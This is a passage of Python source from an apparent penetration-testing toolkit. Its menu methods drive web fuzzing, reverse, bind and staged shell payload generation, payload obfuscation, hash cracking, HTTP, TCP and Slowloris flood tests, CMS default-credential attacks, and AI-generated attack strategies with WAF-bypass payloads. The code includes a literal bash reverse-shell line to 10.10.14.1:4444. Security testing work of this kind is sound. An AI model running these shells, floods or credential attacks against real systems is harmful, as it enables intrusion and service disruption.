        with console.status("[bold cyan]Fuzzing parameters (GET/POST)...[/bold cyan]"):
            result = run_web_fuzzer(url, scan_type='parameters')
        self.results['findings']['parameter_fuzz'] = result
        ssti = result.get('details', {}).get('ssti_params', [])
        sqli = result.get('details', {}).get('sqli_params', [])
        xss = result.get('details', {}).get('xss_params', [])
        if ssti or sqli or xss:
            console.print(f"[bold red][!!!] VULNERABLE PARAMETERS FOUND![/bold red]")
            console.print(f"  [red]SSTI: {len(ssti)} | SQLi: {len(sqli)} | XSS: {len(xss)}[/red]")
        else:
            console.print(f"[green][+] No vulnerable parameters detected[/green]")

    def _scan_header_fuzz(self):
        """257: Header Fuzz (Bypass/Info Leak)"""
        console.print(f"\n[bold magenta][*] HEADER FUZZ on {self.target}[/bold magenta]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold magenta]Fuzzing headers for bypass/info leak...[/bold cyan]"):
            result = run_web_fuzzer(url, scan_type='headers')
        self.results['findings']['header_fuzz'] = result
        bypass = result.get('details', {}).get('bypass_findings', [])
        info_leak = result.get('details', {}).get('info_leak_findings', [])
        console.print(f"  [green]Bypass: {len(bypass)} | Info Leaks: {len(info_leak)}[/green]")
        for f in bypass[:5]:
            console.print(f"  [red]{f.get('header')}: {f.get('value')} -> {f.get('status_code')}[/red]")

    def _scan_vhost_discovery(self):
        """258: VHost Discovery (Virtual Hosts)"""
        console.print(f"\n[bold cyan][*] VHOST DISCOVERY on {self.target}[/bold cyan]")
        with console.status("[bold cyan]Discovering virtual hosts...[/bold cyan]"):
            result = run_web_fuzzer(self.target, scan_type='vhost')
        self.results['findings']['vhost_discovery'] = result
        vhosts = result.get('details', {}).get('unique_vhosts', [])
        console.print(f"  [green]Found {len(vhosts)} virtual hosts[/green]")
        for v in vhosts[:10]:
            console.print(f"  [cyan]{v}[/cyan]")

    def _scan_recursive_fuzz(self):
        """259: Recursive Fuzz (Deep Discovery)"""
        console.print(f"\n[bold yellow][*] RECURSIVE FUZZ on {self.target}[/bold yellow]")
        with console.status("[bold yellow]Recursive fuzzing (depth=2)...[/bold cyan]"):
            result = run_web_fuzzer(self.target, scan_type='recursive')
        self.results['findings']['recursive_fuzz'] = result
        dirs = result.get('details', {}).get('discovered_directories', [])
        deep = result.get('details', {}).get('deep_results', [])
        console.print(f"  [green]Directories: {len(dirs)} | Deep results: {len(deep)}[/green]")

    def _scan_web_fuzzer_full(self):
        """260: Web Fuzzer Full Scan (All Fuzz Types)"""
        console.print(f"\n[bold red][*] WEB FUZZER FULL SCAN on {self.target}[/bold red]")
        with console.status("[bold red]Running full web fuzzer (content+API+params+headers+vhost)...[/bold cyan]"):
            result = run_web_fuzzer(self.target, scan_type='full')
        self.results['findings']['web_fuzzer_full'] = result
        total = result.get('details', {}).get('total_findings', 0)
        vuln_cats = result.get('details', {}).get('vulnerable_categories', [])
        console.print(f"  [green]Total findings: {total} | Vulnerable: {', '.join(vuln_cats)}[/green]")

    def _scan_reverse_shell_gen(self):
        """261: Reverse Shell Generate (15+ Languages)"""
        console.print(f"\n[bold cyan][*] REVERSE SHELL GENERATION[/bold cyan]")
        ip = Prompt.ask("[bold cyan]Enter LHOST (attacker IP)[/bold cyan]", default="10.10.14.1")
        port = Prompt.ask("[bold cyan]Enter LPORT[/bold cyan]", default="4444")
        lang = Prompt.ask("[bold cyan]Enter language[/bold cyan]", default="bash")
        with console.status("[bold cyan]Generating reverse shells...[/bold cyan]"):
            result = run_shellgen_advanced(ip, scan_type='reverse_shell', port=int(port), lang=lang)
        self.results['findings']['reverse_shell_gen'] = result
        payloads = result.get('findings', [])
        console.print(f"  [green]Generated {len(payloads)} payload(s)[/green]")
        for p in payloads[:5]:
            console.print(f"  [yellow][{p.get('name')}] {p.get('payload', '')[:80]}...[/yellow]")

    def _scan_bind_shell_gen(self):
        """262: Bind Shell Generate (8 Languages)"""
        console.print(f"\n[bold magenta][*] BIND SHELL GENERATION[/bold magenta]")
        port = Prompt.ask("[bold magenta]Enter PORT[/bold magenta]", default="4444")
        lang = Prompt.ask("[bold magenta]Enter language[/bold magenta]", default="bash")
        with console.status("[bold magenta]Generating bind shells...[/bold cyan]"):
            result = run_shellgen_advanced(port=int(port), scan_type='bind_shell', lang=lang)
        self.results['findings']['bind_shell_gen'] = result
        payloads = result.get('findings', [])
        console.print(f"  [green]Generated {len(payloads)} payload(s)[/green]")

    def _scan_shell_obfuscation(self):
        """263: Shell Obfuscation (Base64/Hex/XOR)"""
        console.print(f"\n[bold yellow][*] SHELL OBFUSCATION[/bold yellow]")
        payload = Prompt.ask("[bold yellow]Enter payload to obfuscate[/bold yellow]", default="bash -i >& /dev/tcp/10.10.14.1/4444 0>&1")
        method = Prompt.ask("[bold yellow]Method (base64/hex/url/variable_split/xor_base64)[/bold yellow]", default="base64")
        with console.status("[bold yellow]Obfuscating payload...[/bold cyan]"):
            result = run_shellgen_advanced(scan_type='obfuscate', payload=payload, method=method)
        self.results['findings']['shell_obfuscation'] = result
        findings = result.get('findings', [])
        if findings:
            console.print(f"  [green]Obfuscated: {findings[0].get('obfuscated_payload', '')[:100]}...[/green]")

    def _scan_shell_payload_full(self):
        """264: Shell Payload Full Gen (All Types + Obfuscation)"""
        console.print(f"\n[bold red][*] SHELL PAYLOAD FULL GENERATION[/bold red]")
        ip = Prompt.ask("[bold red]Enter LHOST[/bold red]", default="10.10.14.1")
        port = Prompt.ask("[bold red]Enter LPORT[/bold red]", default="4444")
        with console.status("[bold red]Full payload generation...[/bold cyan]"):
            result = run_shellgen_advanced(ip, scan_type='full', port=int(port))
        self.results['findings']['shell_payload_full'] = result
        total = result.get('details', {}).get('total_payloads', 0)
        console.print(f"  [green]Generated {total} total payloads across all phases[/green]")

    def _scan_hash_identify_adv(self):
        """265: Hash Identify (300+ Hash Types)"""
        console.print(f"\n[bold cyan][*] HASH IDENTIFICATION[/bold cyan]")
        hash_str = Prompt.ask("[bold cyan]Enter hash string[/bold cyan]")
        with console.status("[bold cyan]Identifying hash type...[/bold cyan]"):
            result = run_hash_advanced(hash_str, scan_type='identify')
        self.results['findings']['hash_identify_adv'] = result
        possible = result.get('findings', [])
        top = result.get('details', {}).get('top_match')
        if top:
            console.print(f"  [green]Top match: {top.get('type')} ({top.get('confidence')}% confidence)[/green]")
        for p in possible[:5]:
            console.print(f"  [yellow][{p.get('confidence')}%] {p.get('type')} ({p.get('category')})[/yellow]")

    def _scan_hash_crack_adv(self):
        """266: Hash Crack (Dictionary Attack)"""
        console.print(f"\n[bold red][*] HASH CRACK (Dictionary Attack)[/bold red]")
        hash_str = Prompt.ask("[bold red]Enter hash string[/bold red]")
        with console.status("[bold red]Cracking hash with dictionary attack...[/bold cyan]"):
            result = run_hash_advanced(hash_str, scan_type='crack')
        self.results['findings']['hash_crack_adv'] = result
        if result.get('details', {}).get('cracked'):
            console.print(f"  [bold green][!!!] CRACKED: {result['details']['plaintext']}[/bold green]")
        else:
            console.print(f"  [red][-] Hash not cracked[/red]")

    def _scan_hash_batch_crack(self):
        """267: Hash Batch Crack (Multi-Hash)"""
        console.print(f"\n[bold magenta][*] HASH BATCH CRACK[/bold magenta]")
        hash_file = Prompt.ask("[bold magenta]Enter hash file path[/bold magenta]")
        with console.status("[bold magenta]Batch cracking hashes...[/bold cyan]"):
            result = run_hash_advanced(hash_file, scan_type='batch')
        self.results['findings']['hash_batch_crack'] = result
        cracked = result.get('details', {}).get('cracked', 0)
        total = result.get('details', {}).get('total_hashes', 0)
        rate = result.get('details', {}).get('success_rate', '0%')
        console.print(f"  [green]Cracked: {cracked}/{total} ({rate})[/green]")

    def _scan_hash_online_crack(self):
        """268: Hash Online Crack (Multiple APIs)"""
        console.print(f"\n[bold cyan][*] HASH ONLINE CRACK[/bold cyan]")
        hash_str = Prompt.ask("[bold cyan]Enter hash string[/bold cyan]")
        with console.status("[bold cyan]Trying online cracking services...[/bold cyan]"):
            result = run_hash_advanced(hash_str, scan_type='online')
        self.results['findings']['hash_online_crack'] = result
        if result.get('details', {}).get('cracked'):
            console.print(f"  [bold green][!!!] ONLINE CRACKED: {result['details']['plaintext']} (via {result['details'].get('source', '')})[/bold green]")
        else:
            console.print(f"  [red][-] Not found in online databases[/red]")

    def _scan_hash_full_adv(self):
        """269: Hash Full Scan (Identify + Crack + Online)"""
        console.print(f"\n[bold red][*] HASH FULL SCAN[/bold red]")
        hash_str = Prompt.ask("[bold red]Enter hash string[/bold red]")
        with console.status("[bold red]Full hash scan (identify + crack + online)...[/bold cyan]"):
            result = run_hash_advanced(hash_str, scan_type='full')
        self.results['findings']['hash_full_adv'] = result
        if result.get('details', {}).get('cracked'):
            console.print(f"  [bold green][!!!] HASH CRACKED: {result['details']['plaintext']}[/bold green]")
        else:
            console.print(f"  [red][-] Hash not cracked through any method[/red]")

    def _scan_api_json_fuzz(self):
        """270: API JSON Fuzz (Prototype Pollution/NoSQL)"""
        console.print(f"\n[bold magenta][*] API JSON FUZZ on {self.target}[/bold magenta]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold magenta]Fuzzing JSON API (proto pollution + NoSQL)...[/bold cyan]"):
            result = run_web_fuzzer(url, scan_type='json_api')
        self.results['findings']['api_json_fuzz'] = result
        proto = result.get('details', {}).get('proto_pollution', [])
        nosql = result.get('details', {}).get('nosql_injection', [])
        if proto or nosql:
            console.print(f"[bold red][!!!] JSON FUZZING VULNERABILITIES![/bold red]")
            console.print(f"  [red]Proto Pollution: {len(proto)} | NoSQL Injection: {len(nosql)}[/red]")
        else:
            console.print(f"[green][+] No JSON fuzzing vulnerabilities detected[/green]")

    def _scan_staged_payload_gen(self):
        """271: Staged Payload Generate (Meterpreter-like)"""
        console.print(f"\n[bold cyan][*] STAGED PAYLOAD GENERATION[/bold cyan]")
        ip = Prompt.ask("[bold cyan]Enter LHOST[/bold cyan]", default="10.10.14.1")
        port = Prompt.ask("[bold cyan]Enter LPORT[/bold cyan]", default="8080")
        with console.status("[bold cyan]Generating staged payload...[/bold cyan]"):
            result = run_shellgen_advanced(ip, scan_type='staged', port=int(port), stage=1)
        self.results['findings']['staged_payload_gen'] = result
        stage1 = result.get('findings', [])
        console.print(f"  [green]Stage 1 (dropper): {len(stage1)} variants[/green]")
        server_cmd = result.get('details', {}).get('server_command', '')
        if server_cmd:
            console.print(f"  [yellow]Server: {server_cmd}[/yellow]")

    def _scan_password_candidate_gen(self):
        """272: Password Candidate Gen (Rule-based)"""
        console.print(f"\n[bold yellow][*] PASSWORD CANDIDATE GENERATION[/bold yellow]")
        rule = Prompt.ask("[bold yellow]Rule (common/year_suffix/keyboard/leet/capitalized/mixed/all)[/bold yellow]", default="all")
        count = Prompt.ask("[bold yellow]Count[/bold yellow]", default="500")
        with console.status("[bold yellow]Generating password candidates...[/bold cyan]"):
            result = run_hash_advanced(scan_type='candidates', rule=rule, count=int(count))
        self.results['findings']['password_candidate_gen'] = result
        total = result.get('details', {}).get('total_generated', 0)
        console.print(f"  [green]Generated {total} password candidates[/green]")

    def _scan_fuzzer_shell_hash_combined(self):
        """273: Fuzzer + Shell + Hash Combined"""
        console.print(f"\n[bold red][*] FUZZER + SHELL + HASH COMBINED SCAN on {self.target}[/bold red]")
        all_results = {}

        # Phase 1: Web Fuzzer Quick
        console.print(f"\n[bold cyan]=== Phase 1: Web Fuzzer Quick ===[/bold cyan]")
        with console.status("[bold cyan]Running web fuzzer (content + API)...[/bold cyan]"):
            all_results['content_fuzz'] = run_web_fuzzer(self.target, scan_type='content')
        with console.status("[bold cyan]Running API fuzz...[/bold cyan]"):
            all_results['api_fuzz'] = run_web_fuzzer(self.target, scan_type='api')

        # Phase 2: Shell Generation
        console.print(f"\n[bold magenta]=== Phase 2: Shell Payload Generation ===[/bold magenta]")
        ip = "10.10.14.1"
        with console.status("[bold magenta]Generating reverse shells...[/bold cyan]"):
            all_results['reverse_shells'] = run_shellgen_advanced(ip, scan_type='reverse_shell', port=4444, lang='bash')
        with console.status("[bold magenta]Generating obfuscated payload...[/bold cyan]"):
            all_results['obfuscated'] = run_shellgen_advanced(scan_type='obfuscate', payload='bash -i >& /dev/tcp/10.10.14.1/4444 0>&1', method='base64')

        # Phase 3: Hash Identification
        console.print(f"\n[bold yellow]=== Phase 3: Hash Identification Test ===[/bold yellow]")
        with console.status("[bold yellow]Testing hash identification engine...[/bold cyan]"):
            all_results['hash_test'] = run_hash_advanced('5d41402abc4b2a76b9719d911017c592', scan_type='identify')

        self.results['findings']['fuzzer_shell_hash_combined'] = all_results
        total_findings = sum(len(r.get('findings', [])) if isinstance(r.get('findings'), list) else 1 for r in all_results.values())
        console.print(f"\n[bold green][+] Combined scan complete: {total_findings} total findings across 3 engines[/bold green]")

    def _scan_ddos_cms_crypto_combined(self):
        """293: DDoS + CMS + Crypto Combined"""
        console.print(f"\n[bold red][*] DDoS + CMS + CRYPTO COMBINED SCAN on {self.target}[/bold red]")
        all_results = {}

        # Phase 1: DDoS Resilience Quick
        console.print(f"\n[bold cyan]=== Phase 1: DDoS Resilience Quick Test ===[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing DDoS resilience (4-phase)...[/bold cyan]"):
            all_results['ddos'] = run_ddos_testing(url, scan_type='resilience')
        vulns = all_results['ddos'].get('details', {}).get('vulnerabilities', [])
        prots = all_results['ddos'].get('details', {}).get('protections', [])
        console.print(f"  [red]DDoS Vulnerabilities: {len(vulns)} | Protections: {len(prots)}[/red]")

        # Phase 2: CMS Advanced Scan
        console.print(f"\n[bold magenta]=== Phase 2: CMS Advanced Scan ===[/bold magenta]")
        with console.status("[bold magenta]Running CMS advanced scan (detect + deep)...[/bold cyan]"):
            all_results['cms'] = run_cms_advanced(url, scan_type='full')
        cms_findings = all_results['cms'].get('details', {}).get('total_findings', 0)
        console.print(f"  [green]CMS Findings: {cms_findings}[/green]")

        # Phase 3: Crypto Analysis Demo
        console.print(f"\n[bold yellow]=== Phase 3: Crypto Auto-Decode Test ===[/bold yellow]")
        test_input = "VGhlIHF1aWNrIGJyb3duIGZveCBqdW1wcyBvdmVyIHRoZSBsYXp5IGRvZw=="
        with console.status("[bold yellow]Testing crypto engine (auto-decode)...[/bold cyan]"):
            all_results['crypto'] = run_crypto_advanced(test_input, scan_type='auto')
        crypto_findings = len(all_results['crypto'].get('findings', []))
        console.print(f"  [green]Crypto Decodings Found: {crypto_findings}[/green]")

        self.results['findings']['ddos_cms_crypto_combined'] = all_results
        total = sum(len(r.get('findings', [])) if isinstance(r.get('findings'), list) else 1 for r in all_results.values())
        console.print(f"\n[bold green][+] Combined scan complete: {total} total findings across 3 engines[/bold green]")

    def _scan_http_flood_test(self):
        """274: HTTP Flood Test"""
        console.print(f"\n[bold red][*] HTTP FLOOD TEST on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Testing HTTP flood resilience (GET/POST/HEAD)...[/bold cyan]"):
            result = run_ddos_testing(url, scan_type='http_flood')
        self.results['findings']['http_flood'] = result
        vuln = result.get('vulnerable', False)
        prot = result.get('details', {}).get('protection_detected', False)
        if vuln:
            console.print(f"  [bold red][!!!] NOT PROTECTED - No HTTP flood protection detected[/bold red]")
        elif prot:
            ptype = result.get('details', {}).get('protection_type', 'Unknown')
            console.print(f"  [green][+] PROTECTED - {ptype}[/green]")

    def _scan_slowloris_test(self):
        """275: Slowloris Test"""
        console.print(f"\n[bold yellow][*] SLOWLORIS TEST on {self.target}[/bold yellow]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold yellow]Testing Slowloris vulnerability...[/bold cyan]"):
            result = run_ddos_testing(url, scan_type='slowloris')
        self.results['findings']['slowloris'] = result
        vuln = result.get('vulnerable', False)
        if vuln:
            console.print(f"  [bold red][!!!] VULNERABLE to Slowloris attack[/bold red]")
        else:
            verdict = result.get('details', {}).get('verdict', 'Unknown')
            console.print(f"  [green][+] {verdict}[/green]")

    def _scan_tcp_flood_test(self):
        """276: TCP Flood Test"""
        console.print(f"\n[bold cyan][*] TCP FLOOD TEST on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing TCP flood resilience...[/bold cyan]"):
            result = run_ddos_testing(url, scan_type='tcp_flood')
        self.results['findings']['tcp_flood'] = result
        vuln = result.get('vulnerable', False)
        if vuln:
            console.print(f"  [bold red][!!!] VULNERABLE - No TCP connection rate limiting[/bold red]")
        else:
            console.print(f"  [green][+] TCP flood protection detected[/green]")

    def _scan_rate_limit_adv(self):
        """277: Rate Limit Detection (Advanced)"""
        console.print(f"\n[bold magenta][*] RATE LIMIT DETECTION (ADVANCED) on {self.target}[/bold magenta]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold magenta]Testing rate limiting with increasing speed...[/bold cyan]"):
            result = run_ddos_testing(url, scan_type='rate_limiting')
        self.results['findings']['rate_limit_adv'] = result
        detected = result.get('details', {}).get('rate_limit_detected', False)
        if detected:
            rtype = result.get('details', {}).get('rate_limit_type', 'Unknown')
            until = result.get('details', {}).get('requests_until_limit', '?')
            console.print(f"  [green][+] Rate limit detected: {rtype} (after {until} requests)[/green]")
        else:
            console.print(f"  [bold red][!!!] NO RATE LIMITING - All requests went through[/bold red]")

    def _scan_ddos_resilience(self):
        """278: DDoS Resilience Test (4-Phase)"""
        console.print(f"\n[bold red][*] DDoS RESILIENCE TEST on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Running 4-phase DDoS resilience test...[/bold cyan]"):
            result = run_ddos_testing(url, scan_type='resilience')
        self.results['findings']['ddos_resilience'] = result
        vulns = result.get('details', {}).get('vulnerabilities', [])
        prots = result.get('details', {}).get('protections', [])
        verdict = result.get('details', {}).get('overall_verdict', 'Unknown')
        console.print(f"  [yellow]Verdict: {verdict}[/yellow]")
        for v in vulns[:3]:
            console.print(f"  [red][-] {v}[/red]")
        for p in prots[:3]:
            console.print(f"  [green][+] {p}[/green]")

    def _scan_ddos_full_defense(self):
        """279: DDoS Full Defense Test + Report"""
        console.print(f"\n[bold red][*] DDoS FULL DEFENSE TEST + REPORT on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Running full DDoS defense test and generating report...[/bold cyan]"):
            result = run_ddos_testing(url, scan_type='resilience')
        report = DDoSTestingEngine().generate_defense_report(url, result.get('details', {}).get('phases', {}))
        self.results['findings']['ddos_full_defense'] = {'scan': result, 'report': report}
        risk = report.get('details', {}).get('summary', {}).get('risk_level', 'Unknown')
        console.print(f"  [bold]Risk Level: {risk}[/bold]")
        for rec in report.get('details', {}).get('priority_actions', [])[:5]:
            console.print(f"  [red][!] {rec}[/red]")

    def _scan_cms_detect_adv(self):
        """280: CMS Detection (180+)"""
        console.print(f"\n[bold cyan][*] CMS DETECTION (180+) on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Fingerprinting CMS (180+ signatures)...[/bold cyan]"):
            result = run_cms_advanced(url, scan_type='detect')
        self.results['findings']['cms_detect_adv'] = result
        detected = result.get('findings', [])
        if detected:
            for cms in detected[:5]:
                ver = f" v{cms.get('version')}" if cms.get('version') else ""
                console.print(f"  [green][+] {cms.get('name')}{ver} (via {cms.get('method')})[/green]")
        else:
            console.print(f"  [yellow][-] No CMS detected[/yellow]")

    def _scan_wp_deep(self):
        """281: WordPress Deep Scan"""
        console.print(f"\n[bold green][*] WORDPRESS DEEP SCAN on {self.target}[/bold green]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold green]Running WordPress deep scan (plugins, themes, users, config)...[/bold cyan]"):
            result = run_cms_advanced(url, scan_type='wordpress')
        self.results['findings']['wp_deep'] = result
        details = result.get('details', {})
        findings = details.get('findings', [])
        users = details.get('users', [])
        plugins = details.get('plugins', [])
        console.print(f"  [yellow]Findings: {len(findings)} | Users: {len(users)} | Plugins: {len(plugins)}[/yellow]")
        for f in findings[:5]:
            console.print(f"  [{'red' if f.get('risk') in ['high', 'critical'] else 'yellow'}][{f.get('risk', '?').upper()}] {f.get('finding', '')}[/{'red' if f.get('risk') in ['high', 'critical'] else 'yellow'}]")

    def _scan_joomla_deep(self):
        """282: Joomla Deep Scan"""
        console.print(f"\n[bold orange3][*] JOOMLA DEEP SCAN on {self.target}[/bold orange3]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold orange3]Running Joomla deep scan (components, config, creds)...[/bold cyan]"):
            result = run_cms_advanced(url, scan_type='joomla')
        self.results['findings']['joomla_deep'] = result
        details = result.get('details', {})
        findings = details.get('findings', [])
        components = details.get('components', [])
        console.print(f"  [yellow]Findings: {len(findings)} | Components: {len(components)}[/yellow]")

    def _scan_drupal_deep(self):
        """283: Drupal Deep Scan"""
        console.print(f"\n[bold blue][*] DRUPAL DEEP SCAN on {self.target}[/bold blue]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold blue]Running Drupal deep scan (SA-CORE, config, modules)...[/bold cyan]"):
            result = run_cms_advanced(url, scan_type='drupal')
        self.results['findings']['drupal_deep'] = result
        details = result.get('details', {})
        findings = details.get('findings', [])
        sa_core = details.get('sa_core_checks', [])
        console.print(f"  [yellow]Findings: {len(findings)} | SA-CORE checks: {len(sa_core)}[/yellow]")
        for s in sa_core[:3]:
            console.print(f"  [red][{s.get('risk', '?')}] {s.get('id')}: {s.get('name')} ({s.get('cve', '')})[/red]")

    def _scan_magento_adv(self):
        """284: Magento Scan"""
        console.print(f"\n[bold magenta][*] MAGENTO SCAN on {self.target}[/bold magenta]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold magenta]Running Magento security scan...[/bold cyan]"):
            result = run_cms_advanced(url, scan_type='magento')
        self.results['findings']['magento_adv'] = result
        findings = result.get('details', {}).get('findings', [])
        console.print(f"  [yellow]Findings: {len(findings)}[/yellow]")

    def _scan_cms_default_creds(self):
        """285: CMS Default Creds"""
        console.print(f"\n[bold red][*] CMS DEFAULT CREDENTIAL TESTING on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        # First detect CMS
        with console.status("[bold red]Detecting CMS for credential testing...[/bold cyan]"):
            detect = run_cms_advanced(url, scan_type='detect')
        cms_type = None
        if detect.get('findings'):
            cms_type = detect['findings'][0].get('name')
        with console.status(f"[bold red]Testing default credentials for {cms_type or 'unknown CMS'}...[/bold cyan]"):
            result = run_cms_advanced(url, scan_type='default_creds', cms_type=cms_type)
        self.results['findings']['cms_default_creds'] = result
        if result.get('vulnerable'):
            for f in result.get('findings', []):
                console.print(f"  [bold red][!!!] {f.get('finding', '')}[/bold red]")
        else:
            console.print(f"  [green][+] No default credentials found[/green]")

    def _scan_cms_full_adv(self):
        """286: CMS Full Scan (Detect + Deep + Creds)"""
        console.print(f"\n[bold red][*] CMS FULL SCAN on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Running CMS full scan (detect + deep + creds)...[/bold cyan]"):
            result = run_cms_advanced(url, scan_type='full')
        self.results['findings']['cms_full_adv'] = result
        total = result.get('details', {}).get('total_findings', 0)
        console.print(f"  [green]Total findings: {total}[/green]")

    def _scan_auto_decode_adv(self):
        """287: Auto Decode Advanced"""
        console.print(f"\n[bold cyan][*] AUTO DECODE ADVANCED[/bold cyan]")
        text = Prompt.ask("[bold cyan]Enter encoded/ciphered text[/bold cyan]")
        with console.status("[bold cyan]Auto-decoding with 14 decoders...[/bold cyan]"):
            result = run_crypto_advanced(text, scan_type='auto')
        self.results['findings']['auto_decode_adv'] = result
        best = result.get('details', {}).get('best_match')
        if best:
            console.print(f"  [green]Best match ({best['type']}): {best['decoded'][:80]}...[/green]")

    def _scan_encoding_chain(self):
        """288: Encoding Chain Decode"""
        console.print(f"\n[bold yellow][*] ENCODING CHAIN DECODE[/bold yellow]")
        text = Prompt.ask("[bold yellow]Enter multi-layer encoded text[/bold yellow]")
        depth = Prompt.ask("[bold yellow]Max decode depth[/bold yellow]", default="5")
        with console.status("[bold yellow]Decoding encoding chain (multi-layer)...[/bold cyan]"):
            result = run_crypto_advanced(text, scan_type='chain', max_depth=int(depth))
        self.results['findings']['encoding_chain'] = result
        chain = result.get('details', {}).get('chain', [])
        final = result.get('details', {}).get('final_output', '')
        fully = result.get('details', {}).get('fully_decoded', False)
        console.print(f"  [green]Chain length: {len(chain)} | Fully decoded: {fully}[/green]")
        if final:
            console.print(f"  [yellow]Final output: {final[:100]}...[/yellow]")

    def _scan_xor_crack(self):
        """289: XOR Crack"""
        console.print(f"\n[bold red][*] XOR CRACK[/bold red]")
        text = Prompt.ask("[bold red]Enter XOR-encrypted text (or hex)[/bold red]")
        with console.status("[bold red]Cracking XOR cipher (single + multi-byte)...[/bold cyan]"):
            result = run_crypto_advanced(text, scan_type='xor')
        self.results['findings']['xor_crack'] = result
        best = result.get('details', {}).get('best_single_byte')
        if best:
            console.print(f"  [green]Best key: 0x{best.get('key_hex', '')} -> {best.get('plaintext', '')[:60]}...[/green]")

    def _scan_caesar_crack(self):
        """290: Caesar Crack"""
        console.print(f"\n[bold cyan][*] CAESAR CRACK[/bold cyan]")
        text = Prompt.ask("[bold cyan]Enter Caesar-encrypted text[/bold cyan]")
        with console.status("[bold cyan]Cracking Caesar cipher (all 25 shifts)...[/bold cyan]"):
            result = run_crypto_advanced(text, scan_type='caesar')
        self.results['findings']['caesar_crack'] = result
        best = result.get('details', {}).get('best_match')
        if best:
            console.print(f"  [green]Best shift: {best.get('shift')} -> {best.get('plaintext', '')[:60]}...[/green]")

    def _scan_crypto_frequency(self):
        """291: Crypto Frequency Analysis"""
        console.print(f"\n[bold yellow][*] CRYPTO FREQUENCY ANALYSIS[/bold yellow]")
        text = Prompt.ask("[bold yellow]Enter ciphertext for analysis[/bold yellow]")
        with console.status("[bold yellow]Analyzing letter frequency and cipher type...[/bold cyan]"):
            result = run_crypto_advanced(text, scan_type='frequency')
        self.results['findings']['crypto_frequency'] = result
        cipher_type = result.get('details', {}).get('cipher_type', 'Unknown')
        ic = result.get('details', {}).get('index_of_coincidence', 0)
        console.print(f"  [yellow]Cipher type: {cipher_type} | IC: {ic:.4f}[/yellow]")

    def _scan_crypto_full(self):
        """292: Crypto Full Analysis (6 Phases)"""
        console.print(f"\n[bold red][*] CRYPTO FULL ANALYSIS[/bold red]")
        text = Prompt.ask("[bold red]Enter text for full crypto analysis[/bold red]")
        with console.status("[bold red]Running 6-phase crypto analysis...[/bold cyan]"):
            result = run_crypto_advanced(text, scan_type='full')
        self.results['findings']['crypto_full'] = result
        total = sum(len(p.get('findings', [])) for p in result.get('details', {}).values() if isinstance(p, dict))
        console.print(f"  [green]Total findings across 6 phases: {total}[/green]")

    # ========================================================================
    # v5.0 FUSION BATCH 9 - AI PENTEST + STEALTH + WORDLIST SCANS (Task 6b)
    # ========================================================================

    def _scan_ai_target_analysis(self):
        """294: AI Target Analysis"""
        console.print(f"\n[bold magenta][*] AI TARGET ANALYSIS on {self.target}[/bold magenta]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold magenta]AI analyzing target (tech + risk + recommendations)...[/bold cyan]"):
            result = run_ai_pentest(url, scan_type='analyze', ai_bridge=self.ai)
        self.results['findings']['ai_target_analysis'] = result
        tech = len(result.get('details', {}).get('technologies_detected', []))
        risks = len(result.get('details', {}).get('risk_factors', []))
        console.print(f"  [green]Technologies: {tech} | Risk Factors: {risks}[/green]")
        if result.get('details', {}).get('ai_analysis'):
            console.print(Panel(result['details']['ai_analysis'][:500], title="[bold magenta]AI Analysis[/bold magenta]", border_style="magenta"))

    def _scan_ai_attack_strategy(self):
        """295: AI Attack Strategy"""
        console.print(f"\n[bold magenta][*] AI ATTACK STRATEGY on {self.target}[/bold magenta]")
        url = f"{self.protocol}{self.target}"
        # First run a quick recon to get findings
        with console.status("[bold cyan]Gathering initial findings...[/bold cyan]"):
            recon_result = run_ai_pentest(url, scan_type='analyze', ai_bridge=self.ai)
        with console.status("[bold magenta]AI generating attack strategies...[/bold cyan]"):
            result = run_ai_pentest(scan_type='attack', findings=recon_result, ai_bridge=self.ai)
        self.results['findings']['ai_attack_strategy'] = result
        strategies = len(result.get('details', {}).get('strategies', []))
        chains = len(result.get('details', {}).get('attack_chains', []))
        console.print(f"  [green]Strategies: {strategies} | Attack Chains: {chains}[/green]")

    def _scan_ai_payload_generation(self):
        """296: AI Payload Generation"""
        console.print(f"\n[bold magenta][*] AI PAYLOAD GENERATION on {self.target}[/bold magenta]")
        vuln_type = Prompt.ask("[yellow]Vulnerability type[/yellow]", default="sql_injection",
                               choices=["sql_injection", "xss", "ssrf", "lfi", "ssti", "idor", "cors", "jwt", "open_redirect", "xxe", "nosql"])
        url = f"{self.protocol}{self.target}"
        with console.status(f"[bold magenta]AI generating {vuln_type} payloads...[/bold cyan]"):
            result = run_ai_pentest(scan_type='payloads', vuln_type=vuln_type, context=url, ai_bridge=self.ai)
        self.results['findings']['ai_payload_generation'] = result
        base_count = len(result.get('details', {}).get('payloads', []))
        waf_count = len(result.get('details', {}).get('waf_bypass_payloads', []))
        console.print(f"  [green]Base Payloads: {base_count} | WAF Bypass: {waf_count}[/green]")

    def _scan_ai_vuln_prioritization(self):
        """297: AI Vulnerability Prioritization"""
        console.print(f"\n[bold magenta][*] AI VULNERABILITY PRIORITIZATION on {self.target}[/bold magenta]")
        url = f"{self.protocol}{self.target}"
        # Get findings first
        with console.status("[bold cyan]Gathering findings for prioritization...[/bold cyan]"):
            recon_result = run_ai_pentest(url, scan_type='analyze', ai_bridge=self.ai)
        with console.status("[bold magenta]AI prioritizing vulnerabilities...[/bold cyan]"):
            result = run_ai_pentest(scan_type='prioritize', findings=recon_result, ai_bridge=self.ai)
        self.results['findings']['ai_vuln_prioritization'] = result
        details = result.get('details', {})
        critical = len(details.get('critical', []))
        high = len(details.get('high', []))
